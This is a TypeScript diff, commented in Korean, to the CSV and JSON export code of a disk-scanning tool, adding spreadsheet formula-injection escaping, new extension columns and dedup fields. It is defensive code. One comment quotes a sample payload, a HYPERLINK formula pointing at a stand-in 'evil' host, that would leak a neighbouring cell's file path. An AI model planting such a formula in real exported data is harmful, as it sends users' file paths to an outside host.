@@ -12,8 +12,25 @@ import {
 import { FAILED_KIND_LABELS } from "./notice";
 import { History, HistoryEntry } from "./history";
 
+/**
+ * CSV 셀 이스케이프 + 수식 인젝션 무력화.
+ *
+ * 따옴표·쉼표·개행만 이스케이프하면 Excel·Sheets 는 여전히 =,+,-,@ 나 탭·CR 로
+ * 시작하는 셀을 수식으로 평가한다. name·path·ext 열의 원천은 스캔한 디스크의
+ * 파일명·경로·확장자 — 곧 공격자가 좌우할 수 있는 입력이라, `=HYPERLINK("http://evil",A2)`
+ * 라는 이름의 폴더 하나가 인접 셀의 실제 절대 경로를 외부로 반출한다(OWASP CSV
+ * Injection). 위험 문자로 시작하는 '문자열' 셀 앞에 작은따옴표를 덧대 트리거를 끊는다.
+ *
+ * typeof 로 갈라 문자열에만 적용한다 — size_bytes 같은 수치 열은 원시 number 로
+ * 실려 이 함수를 거치지 않지만, 혹 `-5` 같은 값이 number 로 넘어와도 무력화되지
+ * 않게 한다(name·path·ext·label 은 모두 문자열이라 한꺼번에 덮인다). 프리앰블이
+ * 이 규칙과 원본 복원법(선두 ' 제거)을 밝힌다.
+ */
 function csvCell(value: string | number): string {
-  const s = String(value);
+  let s = String(value);
+  if (typeof value === "string" && /^[=+\-@\t\r]/.test(s)) {
+    s = `'${s}`;
+  }
   return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
 }
 
@@ -96,6 +113,10 @@ export function csvPreamble(
       ` skipped_cloud_bytes=${result.skippedCloudBytes ?? 0} skipped_links=${result.skippedLinks ?? 0}` +
       ` failed_paths_total=${result.failedPathsTotal ?? result.errors}` +
       ` failed_paths_truncated=${result.failedPathsTruncated ?? false}`,
+    // 파일명·경로가 스프레드시트 수식으로 실행되지 않도록 무력화한 사실을 밝힌다.
+    // 무력화된 셀은 선두 작은따옴표(')를 지우면 원본이 된다.
+    "# NOTE: cells starting with = + - @ tab or CR are prefixed with a single quote (') to disable" +
+      " spreadsheet formula execution - strip the leading quote to recover the original value.",
   ];
   if (p) {
     meta.push(`# min_size=${p.minSize} max_depth=${p.maxDepth} max_children=${p.maxChildren}`);
@@ -107,12 +128,15 @@ export function csvPreamble(
     meta.push(
       "# NOTE: rows are hierarchical - a dir row already contains its descendants.",
       /*
-       * 예전 지침('sum kind=file rows, or sum self_bytes')은 실제 데이터에서 둘 다
-       * 틀린 값을 냈다. 백엔드는 node.size = (남긴 자식 합) + truncated_bytes 가 늘
-       * 성립하도록 만들므로 self_bytes 는 모든 행에서 0이고, kind=file 행은 디렉터리당
-       * 상위 10개만 실린다. 지침을 따르는 하류일수록 정확히 틀리는 상태였다.
+       * '깊이별' 복원식('SUM(size_bytes at d) + SUM(truncated_bytes at d)')은 틀렸다.
+       * 백엔드 불변식이 node.size = (남긴 자식 합) + truncated_bytes 라 truncated_bytes 는
+       * 이미 size_bytes 안에 들어 있어, 그 식은 생략분을 이중 계산한다(d=0 만 봐도
+       * 총량 + 루트 생략분이 된다). 깊이·파일리프와 무관하게 늘 성립하는 보편식만 남긴다:
+       * 각 행의 '자기 잔여'(size_bytes − 직속 자식 size_bytes 합)를 모두 더하면 총량이다
+       * (dir 행에서는 truncated_bytes, 파일 행에서는 자기 크기와 같아 정확히 상쇄된다).
        */
-      "# NOTE: total = size_bytes of the depth=0 row; or per depth d, SUM(size_bytes at d) + SUM(truncated_bytes at d).",
+      "# NOTE: total = size_bytes of the depth=0 row; or SUM over all rows of" +
+        " (size_bytes - sum of direct children's size_bytes).",
       "# NOTE: incomplete=1 rows are lower bounds - subtree unreadable (denied/cancelled/depth).",
       // 세 값의 합이 truncated_bytes 와 다르면 사유가 설명하지 못한 차액이 있다는 뜻이다.
       "# CHECK: truncated_bytes_small + _capped + _deep <= truncated_bytes (difference is unexplained).",
@@ -280,15 +304,25 @@ export function buildExtensionCsv(
    * 센티널로 못 박고 테스트까지 둔 이유(하류가 표시 문구를 하드코딩하지 않게 한다)가
    * 마지막 단계에서 무너진 셈이다. 잔여 행도 같은 규칙으로 __residual 키를 쓴다.
    */
+  /*
+   * kinds(접힌 종수)와 is_other 를 함께 싣는다.
+   *
+   * kinds 가 없으면 '그 밖의 확장자 1.5 GiB' 한 줄이 소수의 대형인지 롱테일인지
+   * 파일만으로 판별되지 않는다. is_other 는 아래 otherExtensions 섹션을 상위 30
+   * 목록과 가르는 표식이다 — '기타' 분야의 롱테일 확장자는 정의상 전역 상위 30에
+   * 들지 못해, 이 섹션이 없으면 개별 확장자가 확장자 CSV·JSON 어디에도 없어
+   * 오프라인 분해·분류표 개선 피드백이 끊긴다(지난 라운드 contentCategories 와 동형).
+   */
   const rows: string[] = [
     ...csvPreamble(result, target, "extension", options),
-    "ext,label,category,size_bytes,files,percent_of_total",
+    "ext,label,category,size_bytes,files,percent_of_total,kinds,is_other",
   ];
+  const pctOf = (bytes: number) =>
+    result.totalSize > 0 ? ((bytes / result.totalSize) * 100).toFixed(3) : "0";
   const exts = result.extensions ?? [];
   let listed = 0;
   for (const e of exts) {
     listed += e.size;
-    const pct = result.totalSize > 0 ? ((e.size / result.totalSize) * 100).toFixed(3) : "0";
     rows.push(
       [
         csvCell(e.ext),
@@ -296,22 +330,33 @@ export function buildExtensionCsv(
         csvCell(e.category ?? ""),
         e.size,
         e.files,
-        pct,
+        pctOf(e.size),
+        e.kinds ?? "",
+        0,
       ].join(","),
     );
   }
   const residual = Math.max(0, result.totalSize - listed);
   if (residual > 0) {
-    const pct = result.totalSize > 0 ? ((residual / result.totalSize) * 100).toFixed(3) : "0";
     // 목록이 100%를 설명하지 못하면 '나머지는 어디 갔나'를 사용자가 되짚을 수 없다.
+    rows.push([EXT_RESIDUAL_KEY, csvCell(extLabel(EXT_RESIDUAL_KEY)), "", residual, "", pctOf(residual), "", 0].join(","));
+  }
+  /*
+   * '기타' 분해용 롱테일 섹션. 이들은 위 상위 30(및 residual)과 별개의 보조 축이라
+   * listed 합계에는 더하지 않는다 — 더하면 residual 이 음수가 되거나 총량을 이중
+   * 계산한다. is_other=1 로 표식해 소비자가 두 축을 구분하게 한다.
+   */
+  for (const e of result.otherExtensions ?? []) {
     rows.push(
       [
-        EXT_RESIDUAL_KEY,
-        csvCell(extLabel(EXT_RESIDUAL_KEY)),
-        "",
-        residual,
-        "",
-        pct,
+        csvCell(e.ext),
+        csvCell(extLabel(e.ext)),
+        csvCell(e.category ?? "other"),
+        e.size,
+        e.files,
+        pctOf(e.size),
+        e.kinds ?? "",
+        1,
       ].join(","),
     );
   }
@@ -405,6 +450,9 @@ export function buildJson(result: ScanResult, target: string, options: ExportOpt
       categories: result.categories,
       contentCategories: result.contentCategories,
       extensions: result.extensions,
+      // '기타' 롱테일 확장자. 상위 30에 정의상 들지 못해 extensions 만으로는
+      // 개별 확장자를 오프라인에서 되짚을 수 없다(화이트리스트 누락이었다).
+      otherExtensions: result.otherExtensions,
       largestFiles: result.largestFiles?.map((f) => ({ ...f, path: map(f.path) })),
       failedPaths: failed.map((f) => ({ ...f, path: map(f.path) })),
       root: mapNodePaths(result.root, map),
@@ -425,7 +473,10 @@ export function buildHistoryCsv(history: History, options: ExportOptions = {}): 
   const rows: string[] = [
     `# discan history export exported_at=${new Date().toISOString()}`,
     "# NOTE: one row per scan run; sizes are logical bytes with the same basis as the run.",
-    "path,at,size_bytes,total_files,errors,elevated,size_basis,app_version",
+    // dedup(및 dedup_min_bytes)이 빠지면, 같은 경로를 hardlink/none 으로 각각 스캔한
+    // 두 스냅샷의 총량 차이(WinSxS·패키지 캐시가 링크 수만큼 재계수됨)를 내보낸
+    // 시계열만으로는 재구성할 수 없어 감사 추적이 끊긴다.
+    "path,at,size_bytes,total_files,errors,elevated,size_basis,dedup,dedup_min_bytes,app_version",
   ];
   const anon = options.anonymizePaths === true;
   const runsOf = (entry: HistoryEntry): HistoryEntry[] =>
@@ -442,6 +493,8 @@ export function buildHistoryCsv(history: History, options: ExportOptions = {}): 
           run.errors ?? "",
           run.elevated ?? "",
           csvCell(run.sizeBasis ?? ""),
+          csvCell(run.dedup ?? ""),
+          run.dedupMinBytes ?? "",
           csvCell(run.appVersion ?? ""),
         ].join(","),
       );
